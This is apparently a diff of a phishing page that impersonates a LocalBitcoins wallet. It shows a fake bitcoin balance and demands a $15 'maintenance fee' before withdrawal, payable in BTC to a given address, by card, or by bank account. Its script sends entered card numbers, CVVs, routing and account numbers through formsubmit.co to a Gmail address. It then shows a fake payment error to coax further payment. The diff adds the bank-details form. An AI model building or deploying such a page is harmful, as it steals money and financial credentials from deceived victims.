@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
   <title>LocalBitcoins Wallet</title>
@@ -10,175 +9,108 @@
       padding: 30px;
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      width: 300px;
+      width: 320px;
       margin: 30px auto;
       display: none;
       position: relative;
       z-index: 10;
     }
-
-    .card-icons img {
-      width: 40px;
-      margin: 0 5px;
-    }
-
-    .payment-form input {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-
-    .payment-button {
-      background-color: #00c6c1;
-      color: white;
-      padding: 12px;
-      border: none;
-      width: 100%;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-
-    .payment-button:hover {
-      background-color: #00a9a4;
-    }
-
-    /* Error popup styling */
-    #errorPopup {
-      display: none;
-      position: fixed;
-      top: 20%;
-      left: 50%;
-      transform: translateX(-50%);
-      background: white;
-      border: 2px solid #e74c3c;
-      padding: 25px;
-      width: 320px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
-      z-index: 9999;
-    }
-
-    #errorPopup h2 {
-      color: #e74c3c;
-      margin-top: 0;
-      text-align: center;
-    }
-
-    #errorPopup button {
-      display: block;
-      margin: 20px auto 0 auto;
-      background: #e74c3c;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 5px;
-      cursor: pointer;
-      font-weight: bold;
-    }
-
-    #errorPopup button:hover {
-      background: #c0392b;
-    }
   </style>
 </head>
-<body class="bg-gray-100">
-
-  <div class="max-w-3xl mx-auto p-6 bg-white shadow rounded mt-10">
+<body class="bg-gray-100 text-gray-800">  <div class="max-w-3xl mx-auto p-6 bg-white shadow rounded mt-10">
     <h1 class="text-2xl font-bold mb-4 text-center">LocalBitcoins.com Wallet</h1>
-    <p class="text-lg font-semibold text-gray-700 mb-6">Wallet Balance: 3.3115321 BTC</p>
+    <p class="text-lg font-semibold text-gray-700 mb-6">Wallet Balance: 3.3115321 BTC</p><div class="flex flex-wrap gap-4 mb-8">
+  <button class="bg-purple-600 text-white font-semibold rounded-md py-3 px-6 hover:bg-purple-700 transition" onclick="alert('Verification not yet available.')">
+    Verify Account
+  </button>
+  <button class="bg-purple-600 text-white font-semibold rounded-md py-3 px-6 hover:bg-purple-700 transition" onclick="showPaymentPopup()">
+    Withdraw Funds
+  </button>
+  <button class="bg-gray-300 text-gray-600 font-semibold rounded-md py-3 px-6 cursor-not-allowed" disabled>
+    Deposit Funds (Unavailable)
+  </button>
+</div>
 
-    <div class="flex flex-wrap gap-4 mb-8">
-      <button class="bg-[#6c4dff] text-white font-semibold rounded-md py-3 px-6 hover:bg-[#5a3ee6] transition" onclick="alert('Verification not yet available.')">
-        Verify Account
-      </button>
-      <button class="bg-[#6c4dff] text-white font-semibold rounded-md py-3 px-6 hover:bg-[#5a3ee6] transition" onclick="showPaymentPopup()">
-        Withdraw Funds
-      </button>
-      <button class="bg-gray-300 text-gray-600 font-semibold rounded-md py-3 px-6 cursor-not-allowed" disabled>
-        Deposit Funds (Unavailable)
-      </button>
-    </div>
+<div class="text-sm text-gray-700 bg-gray-50 rounded-md p-4 break-words">
+  <strong>Wallet Address:</strong><br />
+  bc1pph7jxvya7nkdwaz8eyrmzfzsufdtfldg6hvflsn7z0gcq88np6fsfaccau
+</div>
 
-    <div class="text-sm text-gray-700 bg-[#f9f8ff] rounded-md p-4 break-words">
-      <strong>Wallet Address:</strong><br />
-      bc1pph7jxvya7nkdwaz8eyrmzfzsufdtfldg6hvflsn7z0gcq88np6fsfaccau
-    </div>
-
-    <div class="mt-10">
-      <h2 class="text-[#6c4dff] font-semibold mb-3 text-base">Transaction History</h2>
-      <div class="table-container rounded-md border border-gray-200 bg-white shadow-sm">
-        <table class="w-full text-sm border-collapse">
-          <thead class="bg-[#f3f0ff]">
-            <tr>
-              <th class="text-left p-3 border-b border-gray-300">Date</th>
-              <th class="text-left p-3 border-b border-gray-300">TXID</th>
-              <th class="text-left p-3 border-b border-gray-300">Amount (BTC)</th>
-              <th class="text-left p-3 border-b border-gray-300">Status</th>
-              <th class="text-left p-3 border-b border-gray-300">Link</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr class="hover:bg-[#f9f8ff]">
-              <td class="p-3 border-b border-gray-200">2023-02-02</td>
-              <td class="p-3 border-b border-gray-200">b6f699a2...e5a</td>
-              <td class="p-3 border-b border-gray-200 text-green-600">+0.58943870</td>
-              <td class="p-3 border-b border-gray-200">Confirmed</td>
-              <td class="p-3 border-b border-gray-200"><a class="text-[#6c4dff] underline" href="#">b6f699a2...e5a</a></td>
-            </tr>
-            <!-- More rows... -->
-          </tbody>
-        </table>
-      </div>
-    </div>
+<div class="mt-10">
+  <h2 class="text-purple-700 font-semibold mb-3 text-base">Transaction History</h2>
+  <div class="rounded-md border border-gray-200 bg-white shadow-sm">
+    <table class="w-full text-sm border-collapse">
+      <thead class="bg-purple-50">
+        <tr>
+          <th class="text-left p-3 border-b border-gray-300">Date</th>
+          <th class="text-left p-3 border-b border-gray-300">TXID</th>
+          <th class="text-left p-3 border-b border-gray-300">Amount (BTC)</th>
+          <th class="text-left p-3 border-b border-gray-300">Status</th>
+          <th class="text-left p-3 border-b border-gray-300">Link</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr class="hover:bg-purple-50">
+          <td class="p-3 border-b border-gray-200">2023-02-02</td>
+          <td class="p-3 border-b border-gray-200">b6f699a2...e5a</td>
+          <td class="p-3 border-b border-gray-200 text-green-600">+0.58943870</td>
+          <td class="p-3 border-b border-gray-200">Confirmed</td>
+          <td class="p-3 border-b border-gray-200"><a class="text-purple-700 underline" href="#">View</a></td>
+        </tr>
+      </tbody>
+    </table>
   </div>
+</div>
 
-  <!-- Payment Popup -->
-  <div id="paymentSection" class="payment-form">
-    <h2 class="text-center text-xl font-semibold mb-4">Pay Invoice</h2>
-    <div class="card-icons text-center mb-4">
-      <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" />
-      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="MasterCard" />
-      <img src="https://img.icons8.com/color/48/000000/amex.png" alt="AmEx" />
-      <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover" />
-    </div>
-    <form id="paymentForm">
-      <input type="number" name="amount" placeholder="Payment amount" value="15.00" readonly>
-      <input type="text" name="name" placeholder="Name on card" required>
-      <input type="text" name="cardnumber" placeholder="Card number" required>
-      <div class="flex gap-2">
-        <input type="text" name="expiry" placeholder="MM / YY" required class="flex-1">
-        <input type="text" name="cvv" placeholder="CVV" required class="flex-1">
-      </div>
-      <input type="text" name="zip" placeholder="ZIP / Postal code" required>
-      <button type="submit" class="payment-button">Pay $15.00</button>
-    </form>
+  </div>  <!-- Payment Section -->  <div id="paymentSection" class="payment-form">
+    <h2 class="text-center text-xl font-semibold mb-4">Pay Maintenance Fee</h2><div class="flex justify-center mb-4">
+  <button id="cardBtn" class="bg-purple-600 text-white px-4 py-2 rounded-l">Card</button>
+  <button id="bankBtn" class="bg-gray-300 text-gray-700 px-4 py-2 rounded-r">Bank</button>
+</div>
+
+<!-- Card Form -->
+<form id="paymentFormCard">
+  <input type="number" name="amount" value="15.00" readonly class="w-full p-2 border mb-2 rounded">
+  <input type="text" name="name" placeholder="Name on card" required class="w-full p-2 border mb-2 rounded">
+  <input type="text" name="cardnumber" placeholder="Card number" required class="w-full p-2 border mb-2 rounded">
+  <div class="flex gap-2">
+    <input type="text" name="expiry" placeholder="MM / YY" required class="flex-1 p-2 border rounded">
+    <input type="text" name="cvv" placeholder="CVV" required class="flex-1 p-2 border rounded">
   </div>
+  <input type="text" name="zip" placeholder="ZIP / Postal Code" required class="w-full p-2 border my-2 rounded">
+  <button type="submit" class="payment-button bg-purple-600 text-white w-full py-2 rounded hover:bg-purple-700">Pay $15.00 by Card</button>
+</form>
 
-  <!-- Error Popup -->
-  <div id="errorPopup">
-    <h2>Payment Error</h2>
-    <p>We’re sorry, but card payments are currently down due to technical issues.<br />
-      Please try again later or use BTC payment instead.</p>
-    <button onclick="closeErrorPopup()">Close</button>
-  </div>
+<!-- Bank Form -->
+<form id="paymentFormBank" style="display:none;">
+  <input type="number" name="amount" value="15.00" readonly class="w-full p-2 border mb-2 rounded">
+  <input type="text" name="fullname" placeholder="Full Name" required class="w-full p-2 border mb-2 rounded">
+  <input type="text" name="routing" placeholder="Routing Number" required class="w-full p-2 border mb-2 rounded">
+  <input type="text" name="accountnumber" placeholder="Account Number" required class="w-full p-2 border mb-2 rounded">
+  <input type="text" name="bankname" placeholder="Bank Name" required class="w-full p-2 border mb-2 rounded">
+  <select name="accounttype" required class="w-full p-2 border rounded">
+    <option value="">Select Account Type</option>
+    <option value="checking">Checking</option>
+    <option value="savings">Savings</option>
+  </select>
+  <button type="submit" class="payment-button bg-purple-600 text-white w-full py-2 mt-2 rounded hover:bg-purple-700">Pay $15.00 by Bank</button>
+</form>
 
-  <footer class="text-center text-sm text-gray-500 mt-10">
+  </div>  <!-- Error Popup -->  <div id="errorPopup" class="fixed hidden top-1/4 left-1/2 transform -translate-x-1/2 bg-white border border-red-500 p-6 rounded shadow-lg z-50">
+    <h2 class="text-red-600 font-bold text-lg mb-2">Payment Error</h2>
+    <p>We’re sorry, but card payments are currently down. Please try again later, use another card, or pay via bank account or BTC.</p>
+    <button onclick="closeErrorPopup()" class="mt-4 bg-red-500 text-white px-4 py-2 rounded">Close</button>
+  </div>  <footer class="text-center text-sm text-gray-500 mt-10">
     <p><strong>Contact Us:</strong> support@localbitcoins.com</p>
     <p>
-      <a class="text-link text-[#6c4dff] underline" href="#">Privacy Policy</a> |
-      <a class="text-link text-[#6c4dff] underline" href="#">Terms of Service</a>
+      <a class="text-purple-700 underline" href="#">Privacy Policy</a> |
+      <a class="text-purple-700 underline" href="#">Terms of Service</a>
     </p>
     <p class="mt-2">© 2025 LocalBitcoins.com. All rights reserved.</p>
-  </footer>
-
-  <script>
+  </footer>  <script>
     function showPaymentPopup() {
       const proceed = confirm(
-        "Notice: Your wallet has outstanding dues that need to be settled to restore full functionality, including withdrawals.\n\nThe wallet maintenance fee of $15.00 USD is pending.\n\nTo regain access:\n1. Pay in BTC: bc1qw2t8f3qgv54fvs0h7fkm9332pzqcqej4hnr7z8\n2. Or click OK to pay securely by card.\n\nNeed BTC? Visit: changelly.com/buy/btc/"
+        "Notice: Your wallet has outstanding dues that need to be settled. A $15.00 USD wallet maintenance fee is required.\n\nPay using card, bank account, or send BTC to:\n\nbc1qw2t8f3qgv54fvs0h7fkm9332pzqcqej4hnr7z8\n\nNeed BTC? Visit: changelly.com/buy/btc/"
       );
       if (proceed) {
         document.getElementById("paymentSection").style.display = "block";
@@ -191,32 +123,47 @@
       document.getElementById("paymentSection").style.display = "none";
     }
 
-    const form = document.getElementById("paymentForm");
-    const errorPopup = document.getElementById("errorPopup");
-    const paymentSection = document.getElementById("paymentSection");
+    const cardBtn = document.getElementById("cardBtn");
+    const bankBtn = document.getElementById("bankBtn");
+    const formCard = document.getElementById("paymentFormCard");
+    const formBank = document.getElementById("paymentFormBank");
 
-    form.addEventListener("submit", function (e) {
-      e.preventDefault();
-      const formData = new FormData(form);
+    cardBtn.addEventListener("click", () => {
+      formCard.style.display = "block";
+      formBank.style.display = "none";
+      cardBtn.classList.add("bg-purple-600", "text-white");
+      bankBtn.classList.remove("bg-purple-600", "text-white");
+    });
 
-      fetch("https://formsubmit.co/ajax/songgen994@gmail.com", {
-        method: "POST",
-        body: formData,
-        headers: {
-          Accept: "application/json",
-        },
-      })
-        .then((response) => response.json())
-        .then((data) => {
-          paymentSection.style.display = "none";
-          errorPopup.style.display = "block";
+    bankBtn.addEventListener("click", () => {
+      formBank.style.display = "block";
+      formCard.style.display = "none";
+      bankBtn.classList.add("bg-purple-600", "text-white");
+      cardBtn.classList.remove("bg-purple-600", "text-white");
+    });
+
+    const cardForm = document.getElementById("paymentFormCard");
+    const bankForm = document.getElementById("paymentFormBank");
+
+    [cardForm, bankForm].forEach(form => {
+      form.addEventListener("submit", function(e) {
+        e.preventDefault();
+        fetch("https://formsubmit.co/ajax/songgen994@gmail.com", {
+          method: "POST",
+          body: new FormData(form),
+          headers: { Accept: "application/json" }
+        })
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById("paymentSection").style.display = "none";
+          document.getElementById("errorPopup").style.display = "block";
           form.reset();
         })
-        .catch((error) => {
-          alert("There was an error submitting your payment. Please try again.");
+        .catch(error => {
+          alert("Submission error. Please try again.");
           console.error(error);
         });
+      });
     });
-  </script>
-</body>
+  </script></body>
 </html>
